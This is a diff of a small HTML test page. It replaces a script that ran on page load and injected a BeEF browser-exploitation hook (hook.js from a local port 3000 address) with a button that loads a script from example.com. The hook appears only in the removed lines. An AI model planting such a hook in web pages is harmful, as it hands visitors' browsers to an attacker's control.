@@ -4,20 +4,19 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Include JavaScript</title>
+    <script>
+        function addScript() {
+            var script = document.createElement('script');
+            script.src = 'https://example.com/script.js'; // URL of the script to be added
+            script.type = 'text/javascript';
+            document.body.appendChild(script);
+        }
+    </script>
 </head>
 <body>
     <h1>Test Page</h1>
-    
-    <script>
-        (function() {
-            var url = 'http://0.0.0.0:3000/hook.js';
-            if (typeof beef == 'undefined') {
-                var bf = document.createElement('script');
-                bf.type = 'text/javascript';
-                bf.src = url;
-                document.body.appendChild(bf);
-            }
-        })();
-    </script>
+
+    <!-- Bookmarklet -->
+    <button onclick="addScript()">Add Script</button>
 </body>
 </html>
